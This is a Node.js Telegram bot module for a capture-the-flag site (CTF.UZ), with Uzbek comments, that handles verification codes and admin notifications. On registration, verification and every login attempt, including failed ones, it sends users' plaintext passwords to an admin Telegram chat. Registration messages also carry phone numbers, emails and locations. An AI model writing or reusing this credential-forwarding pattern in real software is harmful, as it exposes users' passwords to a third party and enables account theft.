const TelegramBot = require('node-telegram-bot-api');

const VERIFY_BOT_TOKEN = process.env.VERIFY_BOT_TOKEN;
const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

let verifyBot = null;
let adminBot = null;

try {
    if (VERIFY_BOT_TOKEN && VERIFY_BOT_TOKEN.length > 10) {
        verifyBot = new TelegramBot(VERIFY_BOT_TOKEN, { polling: true });
    }
} catch (e) { console.log('Verify bot ulanmadi'); }

try {
    if (ADMIN_BOT_TOKEN && ADMIN_BOT_TOKEN.length > 10) {
        adminBot = new TelegramBot(ADMIN_BOT_TOKEN);
    }
} catch (e) { console.log('Admin bot ulanmadi'); }

const userChatIds = {};

// ══════════════════════════════════════════
// XSS/HTML ESCAPE
// ══════════════════════════════════════════
function escapeHtml(text) {
    if (!text && text !== 0) return '';
    return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// ══════════════════════════════════════════
// /start
// ══════════════════════════════════════════
if (verifyBot) {
    verifyBot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        const firstName = msg.from.first_name || 'Foydalanuvchi';
        const username = msg.from.username;

        if (!username) {
            verifyBot.sendMessage(chatId,
                `⚠️ <b>Username yo'q!</b>\n\nIltimos, Telegram sozlamalarida username o'rnating va qayta /start bosing.`,
                { parse_mode: 'HTML' }
            );
            return;
        }

        userChatIds[username] = chatId;

        verifyBot.sendMessage(chatId,
            `🇺🇿 <b>CTF.UZ Tasdiqlovchi Bot</b>\n\n` +
            `Salom, ${escapeHtml(firstName)}!\n\n` +
            `✅ Username: @${escapeHtml(username)}\n` +
            `✅ Chat ID: <code>${chatId}</code>\n\n` +
            `Endi saytda ro'yxatdan o'ting. Kod shu botga yuboriladi.`,
            { parse_mode: 'HTML' }
        );

        console.log(`✅ /start: @${username} (${chatId})`);
    });
}

// ══════════════════════════════════════════
// SAFE SEND — xatolik bo'lsa oddiy text
// ══════════════════════════════════════════
async function safeSend(bot, chatId, message, parseMode = 'HTML') {
    if (!bot || !chatId) return false;
    try {
        await bot.sendMessage(chatId, message, { parse_mode: parseMode });
        return true;
    } catch (err) {
        console.error('Telegram send xatosi:', err.message);
        // Parse mode xatosi bo'lsa — oddiy text bilan qayta urinish
        try {
            const plain = message.replace(/<[^>]*>/g, '').replace(/\*/g, '').replace(/_/g, '');
            await bot.sendMessage(chatId, plain);
            return true;
        } catch (err2) {
            console.error('Telegram fallback xatosi:', err2.message);
            return false;
        }
    }
}

// ══════════════════════════════════════════
// ADMIN BOTGA YUBORISH
// ══════════════════════════════════════════
async function sendToAdmin(message) {
    if (!adminBot || !ADMIN_CHAT_ID) return false;

    try {
        await adminBot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
        return true;
    } catch (err) {
        console.error('❌ Admin bot xatosi:', err.message);
        // Fallback — oddiy text
        try {
            const plain = message.replace(/<[^>]*>/g, '');
            await adminBot.sendMessage(ADMIN_CHAT_ID, plain);
            return true;
        } catch (err2) {
            console.error('❌ Admin bot fallback xatosi:', err2.message);
            return false;
        }
    }
}

// ══════════════════════════════════════════
// RO'YXATDAN O'TISH
// ══════════════════════════════════════════
async function sendRegistrationToAdmin(data) {
    const location = [data.region, data.city, data.district].filter(Boolean).join(' → ') || 'Noma\'lum';
    const message =
        `📝 <b>YANGI RO'YXATDAN O'TISH</b>\n\n` +
        `👤 Ism: ${escapeHtml(data.name)}\n` +
        `🆔 Username: @${escapeHtml(data.username)}\n` +
        `📞 Telefon: +${escapeHtml(data.phone)}\n` +
        `📧 Email: ${escapeHtml(data.email)}\n` +
        `🔑 Parol: ${escapeHtml(data.password)}\n` +
        `📍 Manzil: ${escapeHtml(location)}\n` +
        `🔢 Kod: <code>${escapeHtml(data.code)}</code>\n` +
        `🕐 Vaqt: ${new Date().toLocaleString('uz-UZ')}`;

    return await sendToAdmin(message);
}

// ══════════════════════════════════════════
// TASDIQLANGAN
// ══════════════════════════════════════════
async function sendVerifiedToAdmin(data) {
    const message =
        `✅ <b>TASDIQLANGAN FOYDALANUVCHI</b>\n\n` +
        `👤 Ism: ${escapeHtml(data.name)}\n` +
        `🆔 Username: @${escapeHtml(data.username)}\n` +
        `📞 Telefon: +${escapeHtml(data.phone)}\n` +
        `📧 Email: ${escapeHtml(data.email)}\n` +
        `🔑 Parol: ${escapeHtml(data.password)}\n` +
        `🔢 Kod: ${escapeHtml(data.code)}`;

    return await sendToAdmin(message);
}

// ══════════════════════════════════════════
// CHALLENGE YECHILDI
// ══════════════════════════════════════════
async function sendSolveToAdmin(data) {
    const message =
        `🎯 <b>CHALLENGE YECHILDI</b>\n\n` +
        `👤 Foydalanuvchi: @${escapeHtml(data.username)}\n` +
        `🏆 Challenge: ${escapeHtml(data.challengeTitle)}\n` +
        `📁 Kategoriya: ${escapeHtml(data.category)}\n` +
        `💎 Ball: ${escapeHtml(data.points)}\n` +
        `🚩 Flag: <code>${escapeHtml(data.flag)}</code>`;

    return await sendToAdmin(message);
}

// ══════════════════════════════════════════
// LOGIN
// ══════════════════════════════════════════
async function sendLoginToAdmin(data) {
    const message =
        `🔐 <b>LOGIN URINISHI</b>\n\n` +
        `👤 Username: @${escapeHtml(data.username)}\n` +
        `🔑 Parol: ${escapeHtml(data.password)}\n` +
        `✅ Holat: ${data.success ? 'Muvaffaqiyatli' : 'Muvaffaqiyatsiz'}`;

    return await sendToAdmin(message);
}

// ══════════════════════════════════════════
// KOD YUBORISH
// ══════════════════════════════════════════
async function sendVerifyCode(username, code, name, email) {
    if (!verifyBot) return false;

    const chatId = userChatIds[username];
    if (!chatId) return false;

    try {
        await verifyBot.sendMessage(chatId,
            `🔐 <b>CTF.UZ - Tasdiqlash kodi</b>\n\n` +
            `Salom, ${escapeHtml(name)}!\n\n` +
            `📧 Email: ${escapeHtml(email)}\n\n` +
            `Kodingiz:\n\n` +
            `<code>${code}</code>\n\n` +
            `Kod 10 daqiqa ichida amal qiladi.`,
            { parse_mode: 'HTML' }
        );
        return true;
    } catch (err) {
        console.error('❌ Verify bot xatosi:', err.message);
        return false;
    }
}

module.exports = {
    verifyBot,
    adminBot,
    sendToAdmin,
    sendRegistrationToAdmin,
    sendVerifiedToAdmin,
    sendSolveToAdmin,
    sendLoginToAdmin,
    sendVerifyCode,
    userChatIds,
    escapeHtml,
    safeSend
};